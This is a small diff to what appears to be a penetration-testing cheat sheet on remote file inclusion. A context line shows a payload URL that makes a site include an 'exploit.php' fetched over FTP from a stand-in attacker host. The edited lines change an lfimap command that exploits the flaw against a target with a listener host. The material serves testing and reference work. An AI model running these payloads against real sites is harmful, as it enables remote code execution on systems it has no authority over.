@@ -24,4 +24,4 @@ Include remote 'exploit.php': `http://server/site.php?file=ftp://attacker_ip/exp
 ### Lfimap
 Remote file inclusion can be tested and exploited with [lfimap](https://github.com/hansmach1ne/lfimap).
 
-`python3 lfimap.py "http://server/site.php?file=PWN" -r --no-stop --lhost <IP>`
+`python3 lfimap.py -U "http://server/site.php?file=PWN" -r --no-stop --lhost <IP>`
